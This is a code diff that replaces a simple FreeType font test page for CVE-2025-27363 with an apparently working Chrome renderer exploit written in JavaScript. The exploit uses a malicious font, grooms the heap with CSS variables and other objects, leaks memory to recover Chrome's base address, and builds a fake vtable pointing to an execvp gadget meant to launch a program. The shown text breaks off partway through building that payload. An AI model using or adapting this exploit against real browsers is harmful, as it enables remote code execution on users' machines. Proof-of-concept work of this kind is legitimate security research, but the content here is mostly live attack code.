@@ -1,81 +1,956 @@
-<!DOCTYPE html>
 <html>
-<head>
-  <meta charset="utf-8" />
-  <title>PoC CVE-2025-27363</title>
-  <style>
-	/* Solo por las bromas, fondo negro y texto verde XD*/
-	/* ✅❌ por lo de la IA en PS no deberian de verse*/
-    body {
-      font-family: monospace;
-      background: #000;
-      color: #0f0;
-      padding: 2em;
-      font-size: 18px;
-    }
-    .log {
-      white-space: pre-wrap;
-      margin-top: 2em;
-      background: #111;
-      padding: 1em;
-      border: 1px solid #0f0;
-    }
-    .status {
-      margin-top: 2em;
-      font-size: 32px;
-    }
-    .ok {
-      color: lime;
-    }
-    .fail {
-      color: red;
-    }
-    .glyph-test {
-      font-size: 100px;
-      margin-top: 0em;
-    }
-  </style>
-</head>
-<body>
-  <h1>✅ PS4-FreeType-WebKit-Poc ❌</h1>
-  <div class="glyph-test" id="glyph">%%%%%%%%%%%</div>
-  <button onclick="startPoC()">Start</button>
-  <div class="log" id="log">Esperando...</div>
-  <div class="status" id="status">Sin Iniciar</div>
-
+  
+  <meta charset="utf-8">
+  <head>
 
   <script>
-    const logElem = document.getElementById('log');
-    const statusElem = document.getElementById('status');
-    const glyphElem = document.getElementById('glyph');
+    const kSuperPageBaseMask = 0xffffffffffe00000n
+    const kSuperPageMapMask =  0xfffffffffe000000n
+    const kSuperPageOffsetMask = 0x1fffffn;
+    const kPartitionPageShift  = 14n;
 
-    const log = msg => {
-      logElem.innerText += msg + "\n";
-    };
+    // blink::FileSystemDispatcher::WriteListener::DidWrite
+    const kWriteListenerOffset = 0xcbcc330n;
 
-    async function startPoC() {
-      logElem.innerText = "Iniciando PoC...\n";
-      statusElem.innerText = "";
-      glyphElem.style.fontFamily = "monospace";
-      glyphElem.style.color = "#0f0";
+    // execvp gadget (invoked in LaunchProcess base/process/launch_posix.cc)
+    //
+    // 0x55555d1fee8d <base::GetAppOutputInternal(std::Cr::vector<std::Cr::basic_string<char, std::Cr::char_traits<char>, std::Cr::allocator<char> >, std::Cr::allocator<std::Cr::basic_string<char, std::Cr::char_traits<char>, std::Cr::allocator<char> > > > const&, char* const*, bool, std::Cr::basic_string<char, std::Cr::char_traits<char>, std::Cr::allocator<char> >*, bool, int*)+1229>:	call   0x5555632137a0 <execvp@plt>
+    //
+    const kExecvpGadgetOffset = 0x7caae8dn;
 
-      const font_face = new FontFace('foo', 'url("mal.ttf")');
+    // Vtable of shared_ptr
+    // class IftNativeAllocations {v8/src/wasm/wasm-objects.cc)
+    // <vtable for std::Cr::__shared_ptr_emplace<v8::internal::(anonymous namespace)::IftNativeAllocations, std::Cr::allocator<v8::internal::(anonymous namespace)::IftNativeAllocations> >+0x10>
+    // const wasmNativeSharedPtrVtabOffset = 0xddc2a00n - 0x10n + 0x10n
 
-      try {
-        await font_face.load();
-        log("✅ Font loaded.");
-        document.fonts.add(font_face);
-        glyphElem.style.fontFamily = 'foo';
-        glyphElem.style.color = 'red';
-        log("✅ Font used.");
-        statusElem.className = "ok";
-        statusElem.textContent = "✅ Fuente aplicada correctamente. Si ves los simbolos `%` Poc correcta, sistema vulnerable. No visibles, sistema parcheado.";
-      } catch (err) {
-        log("❌ Font failed to load.");
-        statusElem.className = "fail";
-        statusElem.textContent = "❌ Error al cargar fuente. PoC no ejecutada.";
+
+    // vtable icu_72::MeasureUnit
+    const icu72VtabOffset = 0xdf0d9b0n;
+
+
+    // Since we have a small leak we try to find chrome base from this addresses also
+    //
+    // class JobHandleImpl : public v8::JobHandle (gin/v8_platform.cc)
+    // <vtable for gin::(anonymous namespace)::JobHandleImpl+16>:
+    //  0x555563581b90 <vtable for gin::(a
+    const kJobHandleImplVtabOffset = 0xe02db90n - 0x10n + 0x10n
+
+    // first field points to _hb_NullPool
+    // 0x555556f1a6c0 <_hb_NullPool>:	0x0000000000000000	0x0000000000000000
+    const kChromeDataOffset1 = 0x19c66c0n
+
+    // first field points to vtab
+    // 0x555563678d88 <vtable for blink::CustomFontData+16>
+    const kChromeVtabOffset1 = 0xe124d88n
+
+    const check_offsets = [
+      kJobHandleImplVtabOffset,
+      kChromeDataOffset1,
+      kChromeVtabOffset1,
+      icu72VtabOffset,
+    ]
+
+    const check_vtab = [
+      icu72VtabOffset,
+    ]
+
+    var chromeBase
+    var writelistener_
+    var system_gadget_
+
+
+    const N1=101;
+    const N2=1024 + 664;  // 1024 will hit the new super page, starting from the 1024th chunk there are the good ones
+                          // frist two and last two chunks are not touched
+    const N3=1024;
+
+    // const pino2_string =  "\x0a"
+    // in order to debug we use this string
+    // debug
+    const pino_string = "PINO" 
+    const pino2_string = "PIN12" 
+
+    const N1_plural_rules = 24;
+    const N2_plural_rules = 307;
+    const N3_plural_rules = 0;
+    const plural_rules = new Array(N1_plural_rules + N2_plural_rules + N3_plural_rules);
+
+    const textContent1 = "B"
+
+    var csstarget_pino = [];
+    var csstarget_pino_inv = [];
+
+    var div0;
+    var div1;
+    var rs;
+    var rs1;
+    var font_face;
+
+    var range_fix;
+    var free_at;
+    var leak_size_1;
+
+    const audioCtx = new OfflineAudioContext(1, 4096, 4096);
+    var audioCtxArr = [];
+    var delayNodeArr = [];
+    var srcNodeArr = [];
+
+    // PartitionBucket [0x3f] slot_size: 0x4000, num_system_pages_per_slot_span: 0x4
+    const kCSSString0x4000 = 'C'.repeat(0x3fcc);
+
+    // PartitionBucket [0x8] slot_size: 0x90, num_system_pages_per_slot_span: 0x8
+    const kCSSString0x90 = '0'.repeat(0x5c); 
+    // PartitionBucket [0xa] slot_size: 0xb0, num_system_pages_per_slot_span: 0x4
+    const kCSSString0xb0 = '0'.repeat(0x7c); 
+    // PartitionBucket [0xc] slot_size: 0xd0, num_system_pages_per_slot_span: 0xc
+    const kCSSString0xd0 = '0'.repeat(0x9c); 
+    // PartitionBucket [0xe] slot_size: 0xf0, num_system_pages_per_slot_span: 0x4
+    const kCSSString0xf0 = '0'.repeat(0xbc); 
+
+    // PartitionBucket [0x4] slot_size: 0x50, num_system_pages_per_slot_span: 0x4
+    const kCSSString0x50 = '0'.repeat(0x48); 
+    const barrierString0x200 = '4'.repeat(0x200-0x34); 
+    const barrierString0x200_1 = '3'.repeat(0x200-0x34); 
+    const barrierString0x200_2 = '5'.repeat(0x200-0x34); 
+    const barrierString2k = '8'.repeat(0x1fcc);
+
+
+    function gc() {
+      let x = [];
+      for (let i = 0; i < 200; i++) {
+        x.push(new Array(1024 * 1024));
       }
     }
-  </script>
-</body>
+
+
+    function sleep(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    function log(msg) {
+      console.log(msg);
+    }
+
+    function die(msg) {
+      log(msg);
+      throw msg;
+    }
+
+
+    function str2ab(str) {
+      let buf = new ArrayBuffer(str.length);
+      let view = new Uint8Array(buf);
+      for (let i = 0; i < str.length; i++) {
+        view[i] = str.charCodeAt(i);
+      }
+      return buf;
+    }
+    
+    function u64(str, is_little_endian = true) {
+      if (str.length != 8)
+        die('string length is not 8');
+      let ab = str2ab(str);
+      let view = new DataView(ab);
+      return view.getBigUint64(0, is_little_endian);
+    }
+    
+    function swapEndian(n) {
+      let ab = new ArrayBuffer(8);
+      let view = new DataView(ab);
+      view.setBigUint64(0, n, true);
+      return view.getBigUint64(0, false);
+    }
+
+    function break_on(){
+      for (let i=0; i<100; i++) {
+        new ArrayBuffer(0x600);
+      }
+    }
+
+    async function initAudioContext(count){
+      for (let i = 0; i < count; i++) {
+        let audioCtxDelay = new OfflineAudioContext(1, 4096, 4096);
+        audioCtxArr.push(audioCtxDelay);
+      }
+    }
+
+    async function initDelayNodes(size) {
+      let delay = ((size - 0x20) / 4 - 0x80) / 4096;
+      for (let i = 0; i < audioCtxArr.length; i++) {
+        let audioCtxDelay = audioCtxArr[i];
+        let delayNode = audioCtxDelay.createDelay(delay);
+        delayNodeArr.push(delayNode);
+      }
+    }
+
+    // https://github.com/DarkNavySecurity/PoC/blob/main/CVE-2023-4863/exploit.js#L34
+    async function allocAudioArray(data) {
+      let buffer = audioCtx.createBuffer(1, 0x600, 4096);
+      let dstData = buffer.getChannelData(0);
+      new Uint8Array(dstData.buffer).set(new Uint8Array(data));
+    
+      for (let i = 0; i < audioCtxArr.length; i++) {
+        let audioCtxDelay = audioCtxArr[i];
+        let delayNode = delayNodeArr[i];
+        let srcNode = audioCtxDelay.createBufferSource();
+        srcNodeArr.push(srcNode);
+        srcNode.buffer = buffer;
+        srcNode.connect(delayNode).connect(audioCtxDelay.destination);
+        // audioCtxDelay.suspend((4 * 128)/3072.0);
+        // audioCtxDelay.suspend((3 * 512)/3072.0);
+        audioCtxDelay.suspend(0x600 / 4096.0);
+        srcNode.start();
+        audioCtxDelay.startRendering();
+      }
+      await sleep(500);
+    }
+
+
+
+//////////////////////////////////////
+// PA utils
+
+function get_super_page(address) {
+  return address & kSuperPageBaseMask;
+}
+
+function get_super_page_map(address) {
+  return address & kSuperPageMapMask;
+}
+
+
+function get_partition_page_index(addr) {
+  return (addr & kSuperPageOffsetMask) >> kPartitionPageShift;
+}
+
+function get_slot_span_start(super_page, partition_page_index) {
+  return super_page + (partition_page_index << kPartitionPageShift);
+}
+
+function get_last_slot(super_page, partition_page_index, slot_size) {
+  return (
+    super_page +
+    (partition_page_index << kPartitionPageShift) +
+    slot_size * (BigInt(parseInt(0x4000n / slot_size)) - 1n)
+  );
+}
+
+
+
+//////////////////////////////////////
+// Address distribution utils
+
+function extract_chromebase_from_leak(leak_addresses, check_offsets, superPageMap) {
+  var candidates = new Array(0xff);
+  for (let i=1; i<leak_addresses.length; i++) {
+    let addr = leak_addresses[i];
+    for (let j=0; j<check_offsets.length; j++) {
+      check_offset = check_offsets[j];
+      if (is_chrome_base(addr, check_offset, superPageMap)) {
+        addr -= check_offset;
+        let candidate_index = (addr >> 40n);
+        if (candidates[candidate_index] == undefined) {
+          candidates[candidate_index] = [];
+        }
+        candidates[candidate_index].push(addr);
+      }
+    }
+  }
+
+  // take the chrome base address that has more matching
+  // this should now move us to some kind of probabily space
+  // of hacing same offset and same base addresses
+
+  let most_matching_candidates = [];
+  for (let i=0; i<candidates.length; i++) {
+    let candidate = candidates[i];
+    if (candidate) {
+      if (candidate.length > most_matching_candidates.length) {
+        most_matching_candidates = candidate;
+      }
+    }
+  }
+
+  return most_matching_candidates;
+}
+
+
+// works on linux x64
+function is_chrome_base(addr, offset, superpage_addr) {
+  // check page-level offset
+  let c1 = (offset & 0xfffn) == (addr & 0xfffn);
+  let addr_tmp = addr >> 44n
+  let c2 = (addr_tmp >> 4n) == 0n
+  let c3 = addr_tmp != (superpage_addr >> 44n)
+  return c1 && c2 && c3;
+}
+
+
+
+//////////////////////////////////////
+// HexDump utils
+
+function leQword(view) {
+  let v = 0n;
+  for (let i = 0; i < 8; i++) {
+    const b = BigInt(view[i] ?? 0);
+    v |= (b << (8n * BigInt(i)));
+  }
+  return v;
+}
+
+function leQwordHex(view) {
+  let v = leQword(view);
+  return '0x' + v.toString(16).padStart(16, '0');
+}
+
+// https://evanhahn.com/getting-the-utf16-bytes-of-javascript-strings/
+function* utf16LeBytes(str) {
+  for (let i = 0; i < str.length; i++) {
+    const charCode = str.charCodeAt(i);
+
+    // Get the least significant byte.
+    // For example, given 0x1234, yield 0x34.
+    yield charCode & 0x00ff;
+
+    // Get the most significant byte.
+    // For example, given 0x1234, yield 0x12.
+    yield (charCode & 0xff00) >> 8;
+  }
+}
+
+function get_pointer_all(bytes) {
+  let pointer_length = parseInt(bytes.length / 0x8);
+  var addr = new Array(pointer_length);
+  for (let i=0; i < pointer_length; i++) {
+    let offset = i * 0x8
+    addr[i] = leQword(bytes.slice(offset, offset+8));
+  }
+  return addr;
+}
+
+function get_pointer_at(bytes, index) {
+  const chunk = bytes.subarray(index*8, index*8+8);
+  // Little-endian 64-bit quadwords
+  const q1 = leQword(chunk.slice(0, 8));
+  return q1;
+}
+
+// gpt
+function indexOfSubarray(array, subarray) {
+  for (let i = 0; i <= array.length - subarray.length; i++) {
+    let found = true;
+    for (let j = 0; j < subarray.length; j++) {
+      if (array[i + j] !== subarray[j]) {
+        found = false;
+        break;
+      }
+    }
+    if (found) return i; // return the start index of the match
+  }
+  return -1; // not found
+}
+
+// gpt
+function hexdump(bytes) {
+  if (!(bytes instanceof Uint8Array)) {
+    throw new TypeError('hexdump: expected Uint8Array');
+  }
+
+  const lines = [];
+  var addresses = [];
+
+  for (let offset = 0; offset < bytes.length; offset += 16) {
+    const chunk = bytes.subarray(offset, Math.min(offset + 16, bytes.length));
+
+    // Split into left (first 8 bytes) and right (second 8 bytes)
+    const hexLeft  = Array.from(chunk.slice(0, 8),  b => b.toString(16).padStart(2, '0')).join(' ');
+    const hexRight = Array.from(chunk.slice(8, 16), b => b.toString(16).padStart(2, '0')).join(' ');
+
+    const hexBytes = (hexLeft + '  ' + hexRight).padEnd(16 * 3 + 1, ' ');
+
+    // Little-endian 64-bit quadwords
+    const q1 = leQwordHex(chunk.slice(0, 8));
+    const q2 = leQwordHex(chunk.slice(8, 16));
+
+    // ASCII representation
+    const ascii = Array.from(chunk, b => (b >= 0x20 && b <= 0x7e) ? String.fromCharCode(b) : '.').join('');
+
+    lines.push(`${offset.toString(16).padStart(4, '0')}  ${hexBytes}  ${q1}  ${q2}  ${ascii}`);
+  }
+
+  return lines.join('\n');
+
+}
+
+// gpt
+function bigintToAscii64(value) {
+  // Make sure it's a BigInt
+  let v = BigInt(value);
+
+  // Allocate 8 bytes (64 bits)
+  const buffer = new ArrayBuffer(8);
+  const view = new DataView(buffer);
+
+  // Write the BigInt as uint64 little-endian
+  view.setBigUint64(0, v, true);
+
+  // Convert each byte into ASCII if printable, otherwise "."
+  let ascii = "";
+  for (let i = 0; i < 8; i++) {
+    const byte = view.getUint8(i);
+    ascii += (byte >= 32 && byte <= 126) ? String.fromCharCode(byte) : ".";
+  }
+  return ascii;
+}
+
+
+
+//////////////////////////////////////
+// Exploit code 
+
+    async function exploit() {
+
+      font_face = new FontFace("poc1", "url(mal.ttf)");
+      await font_face.load();
+      div0 = document.getElementById('div0');
+      document.fonts.add(font_face);
+      div0.style.fontFamily = 'poc1';
+
+      // debug
+      // set temporary breakpoint on 
+      // ../../third_party/blink/renderer/core/css/css_variable_data.cc:80
+      // store rax
+      //    set $super_page_addr=$rax
+      //    pa_print_slot_span_info --super_page_list $super_page_addr
+
+      // remove noise
+      // avoid/limit partitionalloc allocating new slot spans for partitionbucket with no slot spans (they point to sentinel slot)
+      // you can inspect which partitionbucket points to sentinel by dumping root, also thread cache should be empty
+      // e.g. pa_print_slot_span_info --root <root-address>
+      // e.g. pa_print_slot_span_info --suca <thread-address>
+      div0.style.setProperty(`--slot90`, kCSSString0x90);
+      div0.style.setProperty(`--slotb0`, kCSSString0xb0);
+      div0.style.setProperty(`--slotd0`, kCSSString0xd0);
+      div0.style.setProperty(`--slotf0`, kCSSString0xf0);
+
+
+      // allocate a new super page in theory this should help having a more controlable slot spans
+      // fill 0x4 slot spans
+      for (let i=0; i<N1; i++) {
+        div0.style.setProperty(`--sprayA${i}`, kCSSString0x4000)
+      }
+
+
+      // debug 
+      // bp1: after super page allocation
+      // break at ../../v8/src/objects/backing-store.cc:291
+      // inspect super page list, one new super page should be visible on the list
+      //    pa_print_slot_span_info --super_page_list $super_page_addr
+      // let bp1 = new ArrayBuffer(0x600);
+
+
+      // clear thread cache and get out all slot spans allocate for 0x10 slot_size object till a new slot span is allocated in the new super page
+      // use the magic pino_string which 
+      // to have an idea on how many chunks you have to allocate use the gdb script as so:
+      //
+      // set a breakpoint at third_party/blink/renderer/core/css/css_variable_data.cc:80
+      // so $rax will contain a super page address of the fastmalloc partitionroot
+      //
+      // check thread bucket
+      //    pa_print_slot_span_info --trace_thread_bucket $super_page_addr --slot_index 0x0
+      //
+      // check slot spans in the partitionbucket
+      //    pa_print_slot_span_info --trace_partition_bucket $super_page_addr --slot_index 0x0
+      //
+      for (let i=0; i<N2+5; i++) {
+        div0.style.setProperty(`--sprayPINO${i}`, pino_string)
+      }
+
+      // make sure the next partition page are kept somewhere so then we can allocate them to leak stuff
+      // in the beginning it was 4k pages, now it's 0x70 since we need it to have a vtable on that slot_size
+      div1 = document.getElementById('div1');
+
+      // shape the memory layout with the following shape  slot spans [0x200][0x800]
+      // 0x200 (32 slot per pp) slot spans near 0x800 (8 slot per pp)
+
+      // This initial alloc is used to ease leak
+      // as barrier insert this
+      for (let i=0; i<N1_plural_rules; i++) {
+          div1.style.setProperty(`--barrier0x200${i}`, barrierString0x200_1);
+          plural_rules[i] = new Intl.PluralRules("en-US");  
+      }
+
+      // TODO: fix this, 2/3 it works :(
+      // range_fix = 31;  1/3
+      // range_fix = 28;  2/3
+      // range_fix = 27; 1/3
+      range_fix = 25; // 7/10 maybe more
+      free_at = 31;
+
+      leak_size_1 = 13;
+
+      for (let j=0; j<4; j++) {
+        div1.style.setProperty(`--pre_leak_2${j}`, barrierString2k);
+      }
+    
+      for (let i=0; i<leak_size_1; i++) {
+        for (let j=i*4; j<(i+1)*4; j++) {
+          div1.style.setProperty(`--leak_2${j}`, barrierString2k);
+        }
+
+        for (let j=i*range_fix; j<(i+1)*range_fix; j++) {
+          div1.style.setProperty(`--leak${j}`, barrierString0x200);
+        }
+      }
+
+      for (let i=leak_size_1; i<leak_size_1+1; i++) {
+        for (let j=i*4; j<(i+1)*4; j++) {
+          div1.style.setProperty(`--leak_2${j}`, barrierString2k);
+        }
+      }
+
+
+      // allocate this barrier to leak vtable
+      // debug
+      // bp2: after pino_string heap spray
+      // ../../v8/src/objects/backing-store.cc:291
+      // look for pino_string in super pages
+      // pa_search $super_page_addr "50 49 4e 4f"
+      // let bp2 = new ArrayBuffer(0x600);
+
+      // free 154+ objects
+      for (let i=N3; i<N2; i+=4) {
+        div0.style.removeProperty(`--sprayPINO${i}`);
+      }
+
+      // fill tcache
+      for (let i=0; i<30; i++) {
+        div0.style.removeProperty(`--sprayPINO${i}`);
+      }
+
+      // what if we don't do now gc ?
+      gc(); await sleep(500);
+
+      div0.textContent=textContent1;
+
+      // increase refs before writing 1 as refcount (initially is set to 2)
+      rs = getComputedStyle(div0);
+      // the default ref_count_ is 2
+      for (let i=N3; i<N2; i+=4) {
+        rs.getPropertyValue(`--sprayPINO${i+1}`)
+        rs.getPropertyValue(`--sprayPINO${i+2}`)
+        rs.getPropertyValue(`--sprayPINO${i+3}`)
+      }
+
+      // in theory we should start from N3+1, but probably at some point the allocation was desync
+      // for (let i=N3+1; i<N2; i+=4) {}
+
+      // debug
+      // bp3: after crafting the memory layout
+      // let bp3 = new ArrayBuffer(0x600);
+
+      // // now we should have a memory layout similar to this
+      // // [cssvar x 3][free][cssvar x 3][free] ... [free][cssvar x 3]
+
+      // Now we have to wait for two "paint"/render steps
+      // in fact i remember first the text is printed with the standard font family
+      // then if the node has a custom font, it is loaded
+      //
+      // The first solution was this one, but it drastically change the memory shape
+      // this should also imply gc()
+      // await new Promise(requestAnimationFrame);
+      // await new Promise(requestAnimationFrame);
+      // // debug
+      // // bp4: after the memory corruption and font rendering
+      // let bp4 = new ArrayBuffer(0x600);
+
+      // Instead this is the solution that was opted since it keeps the memory layout
+      // invoke the thing after main
+      // setTimeout(raceFontRendering, 80);
+
+      // setTimeout(afterMain, 500 * Math.floor(textContent1.length / 2));
+      setTimeout(afterMain, 500);
+
+    }
+
+
+    async function afterMain() {
+      // debug
+      // bp4: before memory corruption
+      //    b ../../third_party/freetype/src/src/truetype/ttgload.c:1878
+      //    continue
+      //
+      //    set $attacker_address=(unsigned long long)points
+      //    set $victim_address=$attacker_address+0x10
+      //
+
+      // debug
+      // bp5: after the memory corrpution and font rendering
+      // check $victim_address.ref_count should be 2 
+      // let bp5 = new ArrayBuffer(0x600);
+
+      // avoid victim_address from being allocated, this will work as a cuscino
+      // also don't touch div0 since even if we touch a not-corrupted chunk, sometimes
+      // css token parsing touches it anyways,
+      rs1 = getComputedStyle(div1);
+      // Making sure the victim object is still on the thread bucket by adding free slots
+      // if we increase the cycle to 4, the victim object will be put on the partition bucket
+      // we are 90% sure it wold be on thread cache, but it can also be put on the partition bucket
+      for (let i=0; i<2; i++) {
+        div1.style.setProperty(`--sprayPINO_again${i}`, pino_string)
+        rs1.getPropertyValue(`--sprayPINO_again${i}`)
+        div1.style.removeProperty(`--sprayPINO_again${i}`);
+      }
+
+      gc(); gc(); gc();
+      await sleep(2500);
+
+      // debug
+      // bp5_2:
+      // in theory now we should have the victim object on the thread bucket
+      // or on the partitionbucket (most likely this one)
+      let bp5_2 = new ArrayBuffer(0x600);
+
+      // 7/10 it works, but maybe more
+      let retry = 3;
+      let pino2_spray_size = 300;
+      let pino2_spray_index = 0;
+      for (let i=0; i<retry; i++) {
+        for (; pino2_spray_index<((i+1)*pino2_spray_size); pino2_spray_index++) {
+          div1.style.setProperty(`--sprayPINO2${pino2_spray_index}`, `spr-${pino2_spray_index}`)
+        }
+        // here we should add maybe some free so it might be put before the victim object
+        gc(); sleep(500);
+      }
+
+      // debug
+      // bp6: after getting back the victim object
+      // let bp6 = new ArrayBuffer(0x600);
+
+      var check_spray;
+      for (let i=0; i<N2; i++) {
+          check_spray = rs.getPropertyValue(`--sprayPINO${i}`);     // <--- this could cause an exception
+          // we found it
+
+          if (check_spray.length > 4) {
+            csstarget_pino.push(i);
+            csstarget_pino_inv.push(parseInt(check_spray.split("-")[1], 10));
+          }
+      }
+
+      // if we reach here we didn't crash, but it could also mean we didn't find the target
+
+      if (check_spray.length > 5) {
+        console.log(`We didn't get back the chunk but got a leak ${check_spray.length}`);
+        console.log(`leak: ${check_spray.substring(result.length - 10)}`);
+      }
+
+      if (csstarget_pino.length != 3) {
+        die("QUIT: one object is missing");
+      }
+
+
+      // if we free pino2 spray, and free all except csstarget_pino
+      // then if we lucky we might end up with and empty slot span and so we
+      // can get it back as cssvar but with a different size and use then csstarget_pino to leak
+      //
+      // BUT, for reasons maybe related to optimization, when you touch any property of
+      // a tag, it will also 
+
+      console.log(`Victim object referenceable from spray (sprayPINO) object ${csstarget_pino}`)
+      console.log(`also referenceable from spray (sprayPINO2) object ${csstarget_pino_inv}`)
+
+      // debug
+      // bp7: Now we know where the victim object is stored
+      // before we start
+      let bp7 = new ArrayBuffer(0x600);
+
+      // reset cssvar refcounters
+      // before moving on, be sure that all ref from spray1 are reset
+      gc(); gc();
+      await sleep(500);
+
+      console.log("ok"); console.log("ok"); // be sure we already invoke console log at least two times
+
+      // be sure a new slot_span returns for 0x50 slot_size chunks
+      // we changed the barrier from 4k to 50 so care must be done here
+
+      let csstarget_pino_inv_max = Math.max(...csstarget_pino_inv);
+      let csstarget_pino_inv_min = Math.min(...csstarget_pino_inv);
+
+      let from_1 = csstarget_pino_inv_max+1; 
+      let to_1 = from_1+40;   // care on this value
+      let middle_1 = from_1+10;
+      if (to_1 >= pino2_spray_index) {
+        from_1 = (csstarget_pino_inv_min)-40; 
+        to_1 = (csstarget_pino_inv_min);
+        middle_1 = from_1+10;
+      }
+
+      for (let i=from_1; i<to_1; i++) {
+        rs1.getPropertyValue(     `--sprayPINO2${i}`);
+        div1.style.removeProperty(`--sprayPINO2${i}`);
+        if (i == middle_1) {
+          for (let j=0; j<csstarget_pino_inv.length; j++) {
+            rs1.getPropertyValue(     `--sprayPINO2${csstarget_pino_inv[j]}`)
+            div1.style.removeProperty(`--sprayPINO2${csstarget_pino_inv[j]}`)
+          }
+        }
+      }
+
+
+      for (let i=0; i<leak_size_1; i++) {
+        // avoid slot span to be put on the free ring so let's keep one object alive per slot span
+        // the thing that happen when 'marked_full=1' and 'num_allocation=0' on slowpath free
+        for (let j=i*range_fix; j<(i+1)*range_fix; j++) {
+          if (j % free_at) {
+            rs1.getPropertyValue(`--leak${j}`);
+            div1.style.removeProperty(`--leak${j}`);
+          }
+        }
+      }
+
+      for (let i=0; i<38; i++) {
+          div1.style.setProperty(`--pre_barrier${i}`, barrierString0x200_2);
+          if (i % free_at) {
+            rs1.getPropertyValue(`--pre_barrier${i}`);
+            div1.style.removeProperty(`--pre_barrier${i}`);
+          }
+      }
+
+      var leaks = [];
+      var leaks_bytes = [];
+      var leaks_addresses = [];
+
+      gc(); gc();
+      await sleep(500);
+
+      // 7/10 it works but maybe more
+      // tested many times and this seems to work, 300 (+something) is the right number
+      for (let i=N1_plural_rules; i<N2_plural_rules+80; i++) {
+        plural_rules[i] = new Intl.PluralRules("en-US");  
+      }
+
+      // Get leak:
+      let bp8 = new ArrayBuffer(0x600);
+
+      for (let i=0; i<csstarget_pino.length; i++) {
+        let leak = rs.getPropertyValue(`--sprayPINO${csstarget_pino[i]}`);
+        // if the object was not freed, or allocated to a different object, etc., just try to get the leak
+        if ( (leak.length) < 0x8 )
+          die(`A invalid chunk returned on spray ${csstarget_pino[i]}`);
+
+        let leak_bytes = new Uint8Array(utf16LeBytes(leak));
+        let leak_addresses = get_pointer_all(leak_bytes);
+        leaks.push(leak);
+        leaks_bytes.push(leak_bytes);
+        leaks_addresses.push(leak_addresses);
+      }
+      
+      // console.log("Bene!");
+
+      var first_obj;
+      var second_obj;
+      var third_obj;
+      var good_candidate_at = -1;
+
+      for (let i=0; i<leaks_addresses.length; i++) {
+        first_obj = i;
+        let l1 = leaks_addresses[i][2];
+        let l2 = leaks_addresses[i][4];
+        let good_candidate = true;
+
+        for (let j=(i+1) % leaks_addresses.length; j!=i && good_candidate; j = (j+1) % leaks_addresses.length) {
+          let c1 = leaks_addresses[j][0] == l1;
+          let c2 = leaks_addresses[j][0] == l2;
+
+          if (c1) {
+            second_obj = j;
+
+          } else if (c2){
+            third_obj = j;
+
+          } else {
+            good_candidate = false;
+          }
+        }
+
+        if (good_candidate)
+          break;
+      }
+
+      if ((first_obj == second_obj) || (first_obj == third_obj) || (second_obj == third_obj))
+        die("This should not happen");
+
+      console.log(`chunk's order (in memory): ${csstarget_pino[first_obj]}, ${csstarget_pino[second_obj]}, ${csstarget_pino[third_obj]}`);
+
+      var superPageLeak;
+      var superPageLeak2 = (leaks_addresses[first_obj][1] >> 4n) << 4n;
+      var superPageLeak3 = (leaks_addresses[first_obj][3] >> 4n) << 4n;
+
+      if (superPageLeak2) {
+        if (!(superPageLeak2 % 0x200n)) {
+          good_candidate_at = second_obj;
+          superPageLeak = superPageLeak2;
+        }
+      }
+      if (superPageLeak3) {
+        if (!(superPageLeak3 % 0x200n)) {
+          good_candidate_at = third_obj;
+          superPageLeak = superPageLeak3;
+        }
+      }
+
+      if (good_candidate_at < 0) {
+        die("Didn't found any good object (it should not happen but it could). Only leak is available");
+      }
+
+      console.log(`Found good candidate 0x${superPageLeak.toString(16)}`);
+
+      // console.log( plural_rules[0].select(0)); // "other"
+      // bp9
+      let bp9 = new ArrayBuffer(0x600);
+
+      var superPageBase = get_super_page(superPageLeak);
+      var superPageMap = get_super_page_map(superPageBase);
+
+      var pa_pp_index = get_partition_page_index(superPageLeak);
+      var last_slot = get_last_slot(superPageBase, pa_pp_index, 0x200n);
+      var fake_vtab = last_slot + 0x200n;
+      var increase_refcount_to = fake_vtab - superPageLeak;
+
+      console.log(`Super page leak: 0x${superPageLeak.toString(16)}`);
+      console.log(`Super page base: 0x${superPageBase.toString(16)}`);
+      console.log(`Super page mapping (probably) starts from: 0x${superPageMap.toString(16)}`);
+      console.log(`Fake vtab address: 0x${fake_vtab.toString(16)} (it should contain the string 'UUUU..'`);
+
+      var leak_pointers = [];
+      let leak = leaks[third_obj];
+      let leak_bytes = leaks_bytes[third_obj];
+      let leak_addresses = leaks_addresses[third_obj];
+
+      if (leak.length < (leaks[second_obj].length-0x10)) {
+        leak = leaks[second_obj];
+        leak_bytes = leaks_bytes[second_obj];
+        leak_addresses = leaks_addresses[second_obj];
+      }
+
+      if (leak.length < (leaks[first_obj].length-0x20)) {
+        leak = leaks[first_obj];
+        leak_bytes = leaks_bytes[first_obj];
+        leak_addresses = leaks_addresses[first_obj];
+      }
+
+      let barrier_pattern = "\x02\x00\x00\x00\xcc\x01\x80\x0044444444";
+      if (leak.indexOf(barrier_pattern) > 0) {
+        leak_pointers = extract_chromebase_from_leak(leak_addresses, check_vtab, superPageMap);
+      }
+      
+      if (!leak_pointers.length) {
+        leak_pointers = extract_chromebase_from_leak(leak_addresses, check_offsets, superPageMap);
+      }
+
+      if (!leak_pointers.length) {
+        console.log(hexdump(leak_bytes));
+        die("Sorry the leak does not show any valuable information");
+      }
+
+      chromeBase = leak_pointers[0];
+      writelistener_ = chromeBase + kWriteListenerOffset;
+      system_gadget_ = chromeBase + kExecvpGadgetOffset;
+       
+      if ( !( (writelistener_ & 0xfffn) == (kWriteListenerOffset & 0xfffn) &&
+        (system_gadget_ & 0xfffn) == (kExecvpGadgetOffset & 0xfffn)) ) {
+        die(`[X] Chrome base is not correct: 0x${chromeBase.toString(16)}  ..quit`);
+      }
+
+      console.log(`Chrome base: 0x${chromeBase.toString(16)}`);
+      console.log(`WriteListener callback: 0x${writelistener_.toString(16)}`);
+      console.log(`System gadget: 0x${system_gadget_.toString(16)}`);
+
+      // bp
+      let bp10 = new ArrayBuffer(0x600);
+
+      var fake_vtab_ptr = fake_vtab+0x30n;
+      var xcalc_ascii = 0x636c616378n - 1n;
+
+      let ab = new ArrayBuffer(0x600);
+
+      let view = new DataView(ab);
+      for (let i = 0; i < view.byteLength; i++)
+        view.setUint8(i, 0x42);
+
+      view.setBigUint64(0x10, fake_vtab_ptr, true);
+      view.setBigUint64(0x20, fake_vtab_ptr, true);
+      view.setBigUint64(0x30, xcalc_ascii, true);
+      view.setBigUint64(0x38, system_gadget_, true);
+      view.setBigUint64(0x50, writelistener_, true);
+      view.setBigUint64(0x80, 0n, true);
+      // view.setBigUint64(0x90, 1, true);
+      view.setBigUint64(0xb8, 0n, true);
